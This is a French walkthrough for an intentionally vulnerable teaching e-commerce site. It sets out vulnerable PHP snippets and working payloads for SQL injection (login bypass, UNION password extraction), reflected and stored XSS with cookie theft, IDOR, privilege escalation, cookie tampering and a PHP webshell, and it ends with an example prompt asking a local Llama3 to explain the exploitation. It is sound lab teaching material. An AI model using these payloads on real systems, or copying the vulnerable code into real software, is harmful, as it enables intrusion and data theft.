# Documentation des Vulnérabilités - TechStore

> Site e-commerce volontairement vulnérable à des fins pédagogiques

---

## Comptes de test

| Username | Password | Rôle | Note |
|----------|----------|------|------|
| `admin` | `admin123` | Admin | Hash MD5 |
| `user1` | `password` | User | Hash MD5 |
| `test` | `motdepasse123` | User | **EN CLAIR** (visible avec UNION) |

---

## 1. SQL Injection - Bypass Login

**Page:** `login.php`

**Vulnérabilité:** La requête SQL utilise une concaténation directe sans échappement.

```php
$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";
```

### Attaques

| Username | Password | Résultat |
|----------|----------|----------|
| `admin'#` | test | Connecté en admin |
| `' OR 1=1#` | test | Connecté en premier user (admin) |
| `user1'#` | test | Connecté en user1 |
| `' OR '1'='1'#` | test | Connecté en admin |

### Explication

Avec `admin'#`, la requête devient:
```sql
SELECT * FROM users WHERE username='admin'#' AND password=MD5('test')
```
Le `#` commente le reste, donc seul le username est vérifié.

---

## 2. SQL Injection - Afficher tous les produits

**Page:** `products.php`

**Vulnérabilité:** Le paramètre de recherche est injecté directement.

```php
$query .= " AND name = '$search'";
```

### Attaque

| Recherche | Résultat |
|-----------|----------|
| `' OR '1'='1` | Affiche tous les produits |

### Explication

La requête devient:
```sql
SELECT * FROM products WHERE 1=1 AND name = '' OR '1'='1' ORDER BY name
```
La condition `'1'='1'` est toujours vraie.

---

## 3. SQL Injection - Extraire les mots de passe (UNION)

**Page:** `products.php`

### Attaques

| Recherche | Résultat |
|-----------|----------|
| `' UNION SELECT 1,username,3,4,5,6,password FROM users#` | Affiche username + password |
| `' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6,7 FROM users#` | Affiche username:password |
| `' UNION SELECT 1,username,3,4,5,6,email FROM users#` | Affiche username + email |

### Ce que tu vois

Les utilisateurs s'affichent comme des "produits":
- **Nom du produit** = username
- **Catégorie** = password (ou email)

**Important:** L'utilisateur `test` a son mot de passe `motdepasse123` visible en clair!

---

## 4. SQL Injection - Lister les tables

**Page:** `products.php`

### Attaque

```
' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#
```

### Résultat

Affiche toutes les tables: users, products, orders, comments

---

## 5. SQL Injection - URL Produit

**Page:** `product.php?id=X`

**Vulnérabilité:** L'ID n'est pas validé.

```php
$query = "SELECT * FROM products WHERE id = $id";
```

### Attaques

| URL | Résultat |
|-----|----------|
| `product.php?id=1 OR 1=1` | Affiche le premier produit |
| `product.php?id=0 UNION SELECT 1,username,password,4,5,6,7 FROM users` | Affiche user/password |

---

## 6. XSS Réfléchi

**Page:** `products.php`

**Vulnérabilité:** Le terme de recherche est affiché sans échappement.

```php
<p>Résultats pour: <strong><?php echo $search; ?></strong></p>
```

### Attaques

| Recherche | Résultat |
|-----------|----------|
| `<script>alert(1)</script>` | Popup "1" |
| `<script>alert('XSS')</script>` | Popup "XSS" |
| `<script>alert(document.cookie)</script>` | Affiche les cookies |
| `<img src=x onerror=alert(1)>` | Popup "1" |
| `<svg onload=alert(1)>` | Popup "1" |

---

## 7. XSS Stocké (Commentaires)

**Page:** `product.php?id=1`

**Prérequis:** Être connecté

**Vulnérabilité:** Les commentaires sont affichés sans échappement.

```php
<div class="comment-content"><?php echo $comment['content']; ?></div>
```

### Attaques

Dans le champ commentaire:

| Commentaire | Résultat |
|-------------|----------|
| `<script>alert('XSS')</script>` | Popup pour TOUS les visiteurs |
| `<script>alert(document.cookie)</script>` | Vol de cookies |

---

## 8. IDOR - Accès aux commandes

**Page:** `orders.php`

**Prérequis:** Être connecté (user1/password)

**Vulnérabilité:** Pas de vérification que la commande appartient à l'utilisateur.

```php
$detail_query = "SELECT * FROM orders WHERE id = $order_id";
```

### Attaques

| URL | Résultat |
|-----|----------|
| `orders.php?order_id=1` | Commande de admin (adresse: 1 Rue Admin, Paris - CODE: 1234) |
| `orders.php?order_id=2` | Commande de user1 (adresse: 15 Avenue User, Lyon - DIGICODE: 5678) |
| `orders.php?order_id=3` | Commande de test |

**Données sensibles visibles:** Adresses, codes de porte, digicodes

---

## 9. Élévation de privilèges - Mass Assignment

**Page:** `profile.php`

**Prérequis:** Être connecté (user1/password)

**Vulnérabilité:** Tous les champs POST sont acceptés, y compris `role`.

```php
foreach ($_POST as $key => $value) {
    $updates[] = "$key = '$value'";
}
```

### Attaque

1. Va sur `profile.php`
2. Ouvre **F12** (DevTools)
3. Va dans **Console**
4. Tape:
```javascript
document.querySelector('input[name="role"]').value='admin';
```
5. Clique sur **"Mettre à jour"**

### Résultat

Tu deviens admin. Le lien "Admin" apparaît dans le menu.

---

## 10. Cookie Tampering - Accès Admin

**Page:** N'importe quelle page

**Vulnérabilité:** Le rôle est vérifié via cookie non signé.

```php
if (isset($_COOKIE['role']) && $_COOKIE['role'] == 'admin') {
    $is_admin = true;
}
```

### Attaque

1. Ouvre **F12** (DevTools)
2. Va dans **Console**
3. Tape:
```javascript
document.cookie="role=admin; path=/";
```
4. Va sur `admin/dashboard.php`

### Résultat

Accès au panel admin sans être connecté.

---

## 11. File Upload - Webshell

**Page:** `profile.php`

**Prérequis:** Être connecté

**Vulnérabilité:** Aucune validation du type de fichier uploadé.

```php
$filename = $_FILES['avatar']['name'];
move_uploaded_file($_FILES['avatar']['tmp_name'], $upload_dir . $filename);
```

### Attaque

1. Crée un fichier `shell.php`:
```php
<?php system($_GET['cmd']); ?>
```

2. Va sur `profile.php`
3. Upload ce fichier comme "Photo de profil"
4. Accède à: `uploads/avatars/shell.php?cmd=dir`

### Commandes possibles

| URL | Résultat |
|-----|----------|
| `shell.php?cmd=dir` | Liste les fichiers |
| `shell.php?cmd=whoami` | Utilisateur système |
| `shell.php?cmd=type ..\config\database.php` | Lit la config BDD |

---

## 12. Information Disclosure

**Pages:** Toutes

**Vulnérabilité:** Les requêtes SQL sont affichées en commentaires HTML.

### Comment voir

1. Fais une action sur le site
2. Affiche le code source (Ctrl+U)
3. Cherche `<!-- DEBUG:` ou `<!-- Query:`

---

## Tableau récapitulatif

| # | Vulnérabilité | Page | Payload |
|---|---------------|------|---------|
| 1 | SQLi Login | login.php | `admin'#` |
| 2 | SQLi Produits | products.php | `' OR '1'='1` |
| 3 | SQLi UNION | products.php | `' UNION SELECT 1,username,3,4,5,6,password FROM users#` |
| 4 | SQLi Tables | products.php | `' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#` |
| 5 | SQLi URL | product.php | `?id=1 OR 1=1` |
| 6 | XSS Réfléchi | products.php | `<script>alert(1)</script>` |
| 7 | XSS Stocké | product.php | Commentaire: `<script>alert(1)</script>` |
| 8 | IDOR | orders.php | `?order_id=1` |
| 9 | Privilege Escalation | profile.php | F12: `document.querySelector('input[name="role"]').value='admin'` |
| 10 | Cookie Tampering | Console F12 | `document.cookie="role=admin; path=/"` |
| 11 | File Upload | profile.php | Upload `shell.php` puis `?cmd=dir` |
| 12 | Info Disclosure | Ctrl+U | Chercher `<!-- DEBUG:` |

---

## Utilisation avec Ollama/Llama3

```bash
ollama run llama3
```

### Exemple de prompt

```
Je teste un site e-commerce vulnérable en local. La page login.php contient:

$query = "SELECT * FROM users WHERE username='$username' AND password=MD5('$password')";

Explique-moi comment exploiter cette injection SQL pour me connecter en admin.
```
